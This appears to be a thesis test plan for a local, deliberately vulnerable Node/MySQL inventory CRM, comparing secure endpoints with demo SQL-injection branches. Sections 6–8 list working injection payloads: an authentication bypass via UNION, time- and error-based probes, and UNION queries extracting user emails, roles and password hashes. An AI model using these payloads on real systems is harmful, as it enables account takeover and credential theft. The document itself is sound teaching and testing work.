# SQL CRM Security Test Plan

Working date: 2026-06-24
Application: React + Node.js/Express + MySQL inventory CRM
Purpose: controlled review for bachelor thesis practical section.

## 1. Scope And Safety

This plan covers only the local SQL CRM application and its local MySQL database.
No tests should be executed against third-party systems.

The test goal is not only to find defects, but to demonstrate the architectural difference between:

1. secure endpoints using validation, authorization, and parameterized SQL,
2. secure endpoints with intentionally vulnerable demo branches,
3. the SQLi Lab endpoint where safe/vuln behavior can be compared under controlled payloads.

For SQL injection validation, follow the methodology already described in the thesis draft:

- identify input points first,
- change exactly one parameter at a time,
- distinguish indication from confirmation,
- compare baseline, benign special-character input, boolean true/false, error, union, and time-based behavior,
- record response status, response body, row count, timing, backend log, and audit log where relevant.

## 2. Preconditions

- Backend running on `http://localhost:4000`.
- Frontend running on `http://localhost:5173`.
- MySQL running locally with the project database.
- Demo flags enabled for the demo layers:
  - `DEMO_VULN=true`
  - `DEMO_SQLI_LAB=true`
- Known admin login:
  - email: `admin@example.com`
  - password: `heslo123`
- Seeded ordinary user accounts for role/authorization tests:
  - `user@example.com` / `heslo123`
  - `viewer@example.com` / `heslo123`
- Before destructive or state-changing tests, follow the snapshot + seed process in `docs/db-test-preparation.md`.

Architecture assumptions from the model-application specification:

- The app is intentionally single-tenant. Tenant isolation, workspaces, IDOR between tenants, and `workspace_id` scoping are future-work topics, not part of the SQLi test scope.
- The secure business API is the default behavior.
- Vulnerable behavior must be intentionally enabled by server-side flags, not by frontend-only state.
- SQLi Lab is an admin-only controlled experiment. It should not expose write/delete SQL templates.
- Lab queries should remain bounded: input length caps, safe limits, deterministic time-based tests, no multi-statement execution, and hard timeout for long DB calls.
- For a stronger final demo environment, consider a dedicated read-only DB user for SQLi Lab.

## 3. Test Accounts And Tokens

Create three request contexts after `npm run db:reset` or `npm run db:seed`:

- `NO_AUTH`: no `Authorization` header.
- `USER_AUTH`: token from `user@example.com`.
- `ADMIN_AUTH`: token from `admin@example.com`.

Every protected endpoint should be tested with all applicable contexts:

- no token should return `401`,
- valid user token should pass normal user endpoints,
- valid user token should return `403` on admin-only endpoints,
- admin token should pass admin-only endpoints.

Endpoint coverage rule:

- every implemented endpoint gets at least auth/role, happy-path, and basic validation coverage,
- every endpoint that accepts user-controlled input reaching SQL gets SQLi negative coverage,
- intentionally vulnerable endpoints get safe/vuln comparison coverage,
- placeholder or intentionally unused endpoints are documented and checked for exposure, but not treated as full business workflows.

## 4. Endpoint Inventory

This inventory is based on the current codebase, not only on the original model-application specification. When the specification and implementation differ, the difference is listed in section 4.5 and should be handled as either a planned change, a conscious simplification, or a thesis discussion point.

### Public / Auth

| Endpoint | Layer | Purpose |
| --- | --- | --- |
| `POST /api/auth/login` | secure public | login, bcrypt compare, JWT issue |
| `POST /api/auth/register` | secure public | create user with hashed password |
| `GET /api/auth/me` | secure | token verification |
| `GET /health`, `GET /healthz`, `GET /api/healthz` | public health | basic availability |

### Secure Application API

| Endpoint | Auth | Role | Notes |
| --- | --- | --- | --- |
| `GET /api/dashboard` | yes | any | aggregate data |
| `GET /api/items` | yes | any | search/sort/paging |
| `GET /api/items/:id` | yes | any | item detail + variants |
| `POST /api/items` | yes | any | create item |
| `PUT /api/items/:id` | yes | admin | update item |
| `DELETE /api/items/:id` | yes | admin | soft delete |
| `GET /api/items/:itemId/variants` | yes | any | list variants |
| `POST /api/items/:itemId/variants` | yes | any | create variant |
| `GET /api/variants/:id` | yes | any | variant detail |
| `PUT /api/variants/:id` | yes | any | update variant |
| `DELETE /api/variants/:id` | yes | any | blocked if movements exist |
| `GET /api/inventory-movements` | yes | any | safe movement list |
| `GET /api/inventory-movements/:id` | yes | any | movement detail |
| `POST /api/inventory-movements` | yes | any | stock mutation |
| `GET /api/settings` | yes | any | settings read |
| `PUT /api/settings` | yes | admin | settings update |
| `GET /api/logs` | yes | admin | audit logs |
| `GET /api/logs/:id` | yes | admin | audit log detail |
| `GET /api/system/health` | yes | any | DB ping |
| `GET /api/system/version` | yes | any | app version |
| `GET /api/system/info` | yes | any | environment info |

### Placeholders / Review-Only

| Endpoint | Status |
| --- | --- |
| `GET /api/admin` | currently not protected, returns placeholder |
| `GET /api/admin/raw-sql` | currently not protected, returns placeholder |
| `POST /api/admin/reset-db` | currently not protected, returns placeholder |
| `GET /api/inventory` | currently not protected, returns placeholder |
| `GET /api/inventory/:variantId` | currently not protected, returns placeholder |

These should be reviewed before thesis demo. Even placeholder admin/reset endpoints should normally be protected or removed.

### Demo / Vulnerable Branch

| Endpoint | Expected Layer | Notes |
| --- | --- | --- |
| `GET /api/demo/ping` | demo public | availability |
| `GET /api/demo/inventory-movements` | auth + admin + vulnerable SQL read | intentionally loose query validation |
| `POST /api/demo/inventory-movements` | auth + admin + safe write | uses safe create path |
| `POST /api/auth/demo/raw-login` | demo vulnerable login | raw SQL in email lookup |

Current demonstration surface: `/api/demo/inventory-movements`, `/api/auth/demo/raw-login`, and `/api/sqli-demo/run`.

### SQLi Lab

| Endpoint | Auth | Role | Purpose |
| --- | --- | --- | --- |
| `POST /api/sqli-demo/run` | yes | admin | controlled safe/vuln SQLi comparison |

Supported by current code:

- `mode`: `safe`, `vuln`
- `pattern`: `boolean`, `union`, `error`, `time`
- intended targets in query factory: `items`, `variants`, `users`

Decision for now: SQLi Lab exposes only implemented and documented targets. `items` and `variants` cover application data; `users` is included as an admin-only academic target, with the default preview intentionally excluding `password_hash`. Consider `movements` as a future target only if we need a lab version of the inventory movement demo.

### Specification vs Current Implementation Deltas

The model-application specification describes the intended design and development notes. The current codebase is close to that design, but not identical. These deltas should be reviewed before executing the full test suite:

| Area | Specification / notes | Current implementation | Test-plan implication |
| --- | --- | --- | --- |
| Auth routes | Notes mention `POST /api/login`, `POST /api/logout`, `GET /api/me` | Current routes are `POST /api/auth/login`, `POST /api/auth/register`, `GET /api/auth/me`; logout is frontend-only and backend returns 404 | Test current routes; document route naming difference |
| Items filters | `search`, `category`, `sort`, `dir`, `page`, `limit`; response from `v_items_with_stock` | Current safe list supports `search`, `limit`, `offset`, `sort`, `dir`; no `category` or `page`; DAO selects from `items`, not the view | Add negative/compatibility tests for unsupported spec params |
| Item demo branches | Spec mentions demo on list/detail/update/delete, including unsafe dynamic `SET` | Current implementation does not expose separate raw item demo endpoints | Document as superseded by SQLi Lab / movement demo |
| Variants filters | `sku`, attributes, min/max stock | Current list by item supports only `limit`, `offset`; body does not include `attributes` | Add "not implemented" tests for spec-only filters; decide if attributes are future work |
| Movements filters | `variant_id`, `type`, `date_from`, `date_to`, `user_id` | Secure endpoint supports `variant_id`, `type`, `note`, `limit`, `offset`; demo vuln endpoint supports the wider filter set | Test secure endpoint as reduced safe surface; test wider filters only on demo vuln route |
| Logs filters | `user_id`, `action`, `date_from`, `date_to` | Current logs support `user_id`, `action`, `limit`, `offset`; no date filters | Add date filter as gap/future work |
| Admin raw SQL | `GET /api/admin/raw-sql?q=` only when `DEMO_VULN=true`, protected | Current endpoint is public placeholder and does not execute SQL | Protect/remove before final demo or keep as documented placeholder |
| Inventory placeholder | Specification treats movements as core inventory module | `/api/inventory` placeholder endpoints are public and not part of current workflow | Protect/remove/place behind auth or document as out of scope |
| SQLi Lab targets | Notes mention targets such as `items`, `users`, `variants` | Query factory supports `items`, `variants`, and admin-only `users` preview without `password_hash` | Keep current target set; add `movements` only if needed |
| Single tenancy | Notes explicitly define app as single-tenant demo | Current schema has no `workspace_id` | Do not test tenant isolation as part of SQLi scope; mention as future work |

## 5. Baseline Functional Tests

### Auth

| Case | Request | Expected |
| --- | --- | --- |
| valid login | `{ "email": "admin@example.com", "password": "heslo123" }` | `200`, token, user role `admin` |
| bad password | same email, wrong password | `401` |
| missing email | `{ "password": "heslo123" }` | `400` |
| malformed email | `{ "email": "x", "password": "heslo123" }` | `400` |
| register valid user | `{ "email": "test+ts@example.com", "password": "heslo123", "name": "Test User" }` | `201`, hashed password in DB |
| register duplicate email | existing email | `400` |
| `/auth/me` valid token | admin token | `200`, user object |
| `/auth/me` invalid token | malformed token | `401` |

### Frontend Auth / Routing Smoke Tests

These tests exist because the model-application notes identify frontend routing as a past failure point.

| Case | Steps | Expected |
| --- | --- | --- |
| login form | submit `admin@example.com` / `heslo123` in UI | navigates to dashboard without full page reload loop |
| token persistence | after login, inspect `localStorage.token` | token exists and is used on reload |
| protected route direct open | open `/items` without token | redirect to `/login` |
| protected route after login | open `/items` with token | page renders and API calls include `Authorization: Bearer ...` |
| stale token | set invalid token manually and reload | `/auth/me` fails, token is cleared, user returns to login |
| React Router nesting | visit `/`, `/items`, `/movements`, `/logs`, `/sqli-demo` | protected layout renders via `Outlet`; no blank page |
| CORS/preflight | observe browser network for non-simple requests | backend responds with CORS headers and request proceeds |

Communication checks:

- frontend should use the central axios client for API calls,
- auth token should be set in one place through the client helper/interceptor,
- request payloads should be JSON objects, not raw strings,
- form submit handlers should not depend on browser autofill quirks.

### Items

Positive payloads:

```json
{ "name": "Audit Item A", "category": "Audit", "description": "Created during API test planning" }
```

Update payload:

```json
{ "name": "Audit Item A Updated", "category": "Audit", "description": "Updated description" }
```

Query baselines:

- `GET /api/items?search=Audit&limit=10&offset=0&sort=name&dir=ASC`
- `GET /api/items?sort=created_at&dir=DESC`

Specification-compatibility checks:

- `GET /api/items?category=Audit` should currently ignore `category` because the safe schema strips unknown query fields.
- `GET /api/items?page=2&limit=10` should currently ignore `page`; pagination is implemented with `offset`.
- `GET /api/items?sort=stock_total` should currently return `400`, even though the original specification mentions `v_items_with_stock`.

Negative validation cases:

- missing `name`
- `name=""`
- `limit=0`
- `limit=101`
- `offset=-1`
- `sort=id`
- `dir=DROP`
- `id=abc`
- `id=12abc` for strict detail path

### Variants

Positive payload:

```json
{ "sku": "AUDIT-SKU-001", "variant_name": "Audit Variant", "price": 199.90, "stock_count": 10 }
```

Update payload:

```json
{ "sku": "AUDIT-SKU-001-U", "variant_name": "Audit Variant Updated", "price": 249.90, "stock_count": 15 }
```

Negative validation cases:

- missing `variant_name`
- `price=-1`
- `stock_count=-1`
- `stock_count=1.5`
- `sku` over 100 chars
- unknown item id for `POST /api/items/:itemId/variants`
- delete variant with existing inventory movement should return `409`

Specification-compatibility checks:

- `GET /api/items/:itemId/variants?sku=AUDIT` should currently ignore `sku`.
- `GET /api/items/:itemId/variants?min_stock=1&max_stock=10` should currently ignore these filters.
- JSON body field `attributes` should be stripped by validation and not persisted.

### Inventory Movements

Positive payloads:

```json
{ "variant_id": 1, "type": "IN", "quantity": 5, "note": "audit in" }
```

```json
{ "variant_id": 1, "type": "OUT", "quantity": 1, "note": "audit out" }
```

```json
{ "variant_id": 1, "type": "ADJUST", "quantity": 3, "note": "audit adjust" }
```

Query baselines:

- `GET /api/inventory-movements?variant_id=1&type=IN&limit=10&offset=0`
- `GET /api/inventory-movements?note=audit`

Specification-compatibility checks:

- `GET /api/inventory-movements?date_from=2025-01-01&date_to=2026-01-01` should currently ignore date filters on the secure endpoint.
- `GET /api/inventory-movements?user_id=1` should currently ignore `user_id` on the secure endpoint.
- The same filters are intentionally available on `/api/demo/inventory-movements`.

Negative validation cases:

- `type=DROP`
- `quantity=0`
- `quantity=-1`
- `variant_id=abc`
- `variant_id=0`
- `limit=201`
- `offset=-1`
- `OUT` greater than available stock should return `400`

Data integrity checks:

- `IN` movement should increase `item_variants.stock_count`.
- `OUT` movement should decrease stock and must not allow negative stock.
- `ADJUST` behavior should be verified against intended semantics in the thesis/application notes.
- movement creation should be transactional: movement row and stock update must either both succeed or both fail.
- movement creation should write an audit log entry with user id, variant id, type, quantity, and note.

Audit coverage checks from the specification notes:

- items: create, update, delete should create audit records,
- variants: create, update, delete should create audit records,
- movements: create should create audit records,
- auth: login success/failure should create audit records,
- logs should store structured `meta` JSON without breaking list/detail views.

### Settings

Positive payload:

```json
{ "warehouse_name": "Audit Warehouse", "currency": "CZK", "low_stock_threshold": 5 }
```

Negative validation cases:

- `{ "id": 2 }`
- `{ "currency": "CZKK" }`
- `{ "currency": "cz" }`
- `{ "low_stock_threshold": -1 }`
- `{ "unknown": "field" }` should become no valid fields and return `400`

### Logs

Query baselines:

- `GET /api/logs?limit=20&offset=0`
- `GET /api/logs?user_id=1`
- `GET /api/logs?action=LOGIN_SUCCESS`
- `GET /api/logs?date_from=2025-01-01&date_to=2026-01-01` should currently ignore date filters; this is a specification gap to document.

Negative validation cases:

- user token should return `403`
- no token should return `401`
- `user_id=abc`
- `limit=201`
- `offset=-1`
- `id=abc`

## 6. Secure Endpoint SQLi Negative Tests

Run these against secure endpoints only after confirming baseline behavior. Expected result: no SQL structure change, no expanded row set, no timing delay, no DB error leak. Status may be `200`, `400`, `401`, or `404` depending on validation context, but behavior must be controlled and repeatable.

Payload group:

```text
'
"
%' OR 1=1 -- 
%' AND 1=2 -- 
%' UNION SELECT 1,2,3,4 -- 
ZZZ%' OR IF(1=1,SLEEP(2),0)=0 -- 
1 OR 1=1
1 AND 1=2
created_at DESC, (SELECT SLEEP(2))
```

Apply one payload at a time to:

- `GET /api/items?search=<payload>`
- `GET /api/items?sort=<payload>`
- `GET /api/items?dir=<payload>`
- `GET /api/items/:id`
- `GET /api/items/:itemId/variants?limit=<payload>`
- `GET /api/variants/:id`
- `GET /api/inventory-movements?variant_id=<payload>`
- `GET /api/inventory-movements?type=<payload>`
- `GET /api/inventory-movements?note=<payload>`
- `GET /api/logs?action=<payload>`
- `GET /api/logs?user_id=<payload>`
- JSON body fields in `POST/PUT` item, variant, movement, and settings endpoints.

Expected secure behavior:

- parameterized search fields treat payload as data,
- allowlisted fields reject unsupported sort/dir/type values,
- numeric IDs reject non-numeric or malformed values,
- no response should include raw SQL stack traces in production-style behavior.

## 7. Demo Vulnerable Branch Tests

These tests are for local thesis demonstration only.

### Raw Login

Endpoint to confirm first:

- active route: `POST /api/auth/demo/raw-login`
- review whether `POST /api/demo/raw-login` should exist; currently it appears unmounted.

Baseline:

```json
{ "email": "admin@example.com", "password": "wrong" }
```

Expected: `401`.

Controlled SQLi confirmation payload:

```json
{
  "email": "x' UNION SELECT 1,'sqli@example.com','letmein','SQLi Demo','admin' -- ",
  "password": "letmein"
}
```

Expected in vulnerable mode: `200`, token for injected admin-like row. This confirms that the email field controls SQL structure.

Safe comparison:

- same payload against `POST /api/auth/login`
- expected: `400` or `401`, no token.

### Vulnerable Inventory Movement Listing

Endpoint:

- `GET /api/demo/inventory-movements`
- requires admin token

Baseline:

- `?limit=5&offset=0`
- `?variant_id=1`
- `?type=IN`
- `?note=audit`

Payloads:

```text
variant_id=1 OR 1=1
variant_id=1 AND 1=2
note=%' OR 1=1 -- 
note=%' AND 1=2 -- 
sort=m.created_at, (SELECT SLEEP(2))
dir=DESC
date_from=2025-01-01' OR '1'='1
user_id=1 OR 1=1
```

Confirmation signals:

- true/false payloads produce different row counts,
- time payload increases response duration,
- safe equivalent `/api/inventory-movements` rejects or neutralizes the same inputs.

Specification payload set for `type` parameter:

```text
type=IN'%20OR%201=1%20%23
type=IN'%20AND%201=0%20%23
type=IN'%20AND%20SLEEP(5)%20%23
type=IN'%20AND%20IF(1=1,SLEEP(5),0)%20%23
type=IN'%20AND%20IF(1=0,SLEEP(5),0)%20%23
type=IN'%20AND%20not_a_column=1%20%23
type=IN'%20AND%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20DATABASE()),0x3a))%20%23
```

Expected thesis mapping:

| Payload type | Expected observation | Meaning |
| --- | --- | --- |
| `OR 1=1` | More rows than baseline | Boolean SQLi true condition |
| `AND 1=0` | Empty or reduced result | Boolean SQLi false condition |
| `SLEEP(5)` / `IF(...SLEEP...)` | Delayed response | Time-based blind confirmation |
| `not_a_column` / `EXTRACTVALUE` | Controlled DB error in demo context | Error-based SQLi confirmation |

UNION leak payloads for local demo only:

```text
type=IN'%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20--%20
```

Email leak:

```text
type=IN'%20UNION%20SELECT%20u.id,NULL,NULL,'LEAK',NULL,u.email,NOW(),u.name,'',''%20FROM%20users%20u%20--%20
```

Role leak:

```text
type=IN'%20UNION%20SELECT%20u.id,NULL,NULL,'ROLE',NULL,u.role,NOW(),u.email,'',''%20FROM%20users%20u%20--%20
```

Password-hash leak:

```text
type=IN'%20UNION%20SELECT%20u.id,NULL,NULL,'HASH',NULL,u.password_hash,NOW(),u.email,'',''%20FROM%20users%20u%20--%20
```

These UNION payloads should be used only after confirming the current movement SELECT column count still matches the ten-column shape expected by the specification notes.

### Stored / Second-Order Note Scenario

The specification notes call out `note` as a useful teaching point. In the current code, `POST /api/demo/inventory-movements` reuses the safe create path, so the note is inserted as data. The vulnerable behavior is expected when that saved note value is later used as a filter in the vulnerable list endpoint.

Planned flow:

1. Create a movement with a note containing a harmless marker.
2. Confirm it is returned normally in secure list/dashboard behavior.
3. Use the vulnerable list endpoint with `note=<payload>` and compare true/false behavior.
4. Document this as a stored-input / second-order-style demonstration only if the stored value is later reused in unsafe SQL construction.

## 8. SQLi Lab Tests

Endpoint:

```http
POST /api/sqli-demo/run
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

Request field convention:

- Frontend sends the user input as `payload`.
- Backend also accepts `q` for compatibility with earlier notes.
- Test collections should prefer `payload` to match the current frontend.

### Boolean

Safe baseline:

```json
{ "mode": "safe", "pattern": "boolean", "target": "items", "payload": "Audit", "limit": 10 }
```

Vulnerable true/false pair:

```json
{ "mode": "vuln", "pattern": "boolean", "target": "items", "payload": "%' OR 1=1 -- ", "limit": 10 }
```

```json
{ "mode": "vuln", "pattern": "boolean", "target": "items", "payload": "%' AND 1=2 -- ", "limit": 10 }
```

Expected: row count differs in vuln mode; safe mode does not change SQL structure.

### Union

Items target has 4 selected columns:

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "items",
  "payload": "%' UNION SELECT 999,'union-name','union-category',NOW() -- ",
  "limit": 10
}
```

Variants target has 6 selected columns:

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "%' UNION SELECT 999,'SKU999','union-variant',9.99,123,'union-item' -- ",
  "limit": 10
}
```

User-data leak variant from the specification notes:

```json
{
  "mode": "vuln",
  "pattern": "union",
  "target": "variants",
  "payload": "%' UNION SELECT id,email,role,0,0,name FROM users -- ",
  "limit": 20
}
```

Expected: injected rows appear in response preview/result for vuln mode. For the user-data leak variant, `sku` maps to email, `variant_name` maps to role, and `item_name` maps to name.

### Error

Column mismatch:

```json
{
  "mode": "vuln",
  "pattern": "error",
  "target": "variants",
  "payload": "%' UNION SELECT 1,2,3 -- ",
  "limit": 10
}
```

Unknown-column error:

```json
{
  "mode": "vuln",
  "pattern": "error",
  "target": "variants",
  "payload": "%' AND not_a_column = 1 -- ",
  "limit": 20
}
```

Expected: controlled DB error visible only in demo/lab context, not in secure endpoints.

### Time

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "ZZZ%' OR IF(1=1,SLEEP(3),0)=0 -- ",
  "durationMs": 3000
}
```

Control:

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "ZZZ%' OR IF(1=2,SLEEP(3),0)=0 -- ",
  "durationMs": 3000
}
```

Expected: true condition is measurably slower than false condition. The implementation should keep the query deterministic and limited to one row so `SLEEP` does not run once per row.

### Target Validation

```json
{ "mode": "safe", "pattern": "boolean", "target": "users", "payload": "admin", "limit": 10 }
```

Expected currently: likely server error or unsupported target because validator and query factory disagree. This should be documented as a finding and fixed before final demo.

## 9. Tooling Plan

### Manual Browser / DevTools

Use for:

- login flow,
- route guard behavior,
- checking `localStorage.token`,
- observing network requests and request payloads.

### REST Client / curl / Postman

Use for:

- deterministic baseline checks,
- saving request/response evidence,
- comparing auth contexts.

Deliverable after this plan is approved:

- a `.http` request file or Postman collection with variables:
  - `baseUrl`
  - `adminToken`
  - `userToken`
  - `itemId`
  - `variantId`
  - `movementId`

### Burp Suite

Use Proxy to capture normal UI requests, then Repeater for:

- single-parameter mutation,
- auth header manipulation,
- body mutation,
- response comparison.

Use Intruder only on local demo endpoints and with a small payload list.

### OWASP ZAP

Use passive scan first.
Active scan should be limited to localhost and preferably to a disposable DB state.

### sqlmap

Use only after manual baseline is documented.
Target only local vulnerable/demo/lab endpoints first.
Do not use destructive options.

Initial sqlmap candidates:

- vulnerable movement list query parameters,
- raw login request captured from Burp,
- SQLi Lab vuln mode request captured from Burp.

Secure endpoints should be tested with sqlmap only after deciding expected behavior and after confirming the DB can be reset.

## 10. Evidence To Capture

For each test case record:

- endpoint and method,
- auth context,
- baseline payload,
- mutated parameter,
- expected status/body/timing,
- actual status/body/timing,
- whether audit log was created,
- backend log snippet if relevant,
- conclusion: pass, fail, expected vulnerable, needs review.

Screenshots/evidence useful for thesis:

- secure endpoint rejecting injection,
- vulnerable endpoint showing boolean true/false difference,
- SQLi Lab safe vs vuln comparison,
- Burp Repeater request/response pair,
- sqlmap result against demo endpoint,
- OWASP ZAP passive findings,
- code snippet showing parameterized query vs raw concatenation.

## 11. Initial Findings To Review Before Running Full Suite

1. `POST /api/admin/reset-db` is currently public placeholder. Decide whether to protect or remove it.
2. `/api/inventory` placeholder endpoints are public. Decide whether this is acceptable.
3. SQLi Lab `target=users` was aligned with the implementation during Phase A step 8. It is now a supported admin-only lab target, but the default preview intentionally excludes `password_hash`.
4. Some lint issues remain outside the auth fix, including duplicate `updateSettings` in `frontend/src/context/SettingsContext.jsx`.

## 12. Proposed Execution Order

### Phase A - Internal Application Review

1. Freeze current DB state or prepare reset/seed strategy.
2. Create admin and user tokens.
3. Run public/auth baseline tests.
4. Run secure endpoint auth/role matrix.
5. Run secure endpoint validation tests.
6. Run secure endpoint SQLi negative tests.
7. Run vulnerable branch tests.
8. Run SQLi Lab safe/vuln comparisons.

Phase A is the currently approved scope.

### Phase B - External Tooling Scenarios

Phase B starts only after Burp Suite, OWASP ZAP, sqlmap, and related tooling are initialized and individual scenarios are prepared.

9. Capture selected flows in Burp Proxy.
10. Re-run selected requests in Burp Repeater.
11. Use Burp Intruder with a small local-only payload list.
12. Run limited ZAP passive scan.
13. Run sqlmap only against approved local demo targets.
14. Summarize tool limits and effectiveness.

### Thesis Mapping

The execution should produce evidence for these practical-section requirements:

- design of the model web application,
- specification and technology choices: React, Node.js/Express, MySQL,
- implementation of intentional SQL Injection vulnerability,
- architecture and key code sections,
- testing environment setup,
- manual exploitation examples,
- automated exploitation examples in Phase B,
- demonstration of Blind, Boolean, Union-based, Error-based, and Time-based techniques,
- examples where exploit mechanics fail,
- mitigation description: parameterized queries, validation, allowlists, controlled feature flags,
- evaluation of tool limits and effectiveness,
- developer recommendations,
- future work: multi-tenancy/workspaces and tenant isolation.
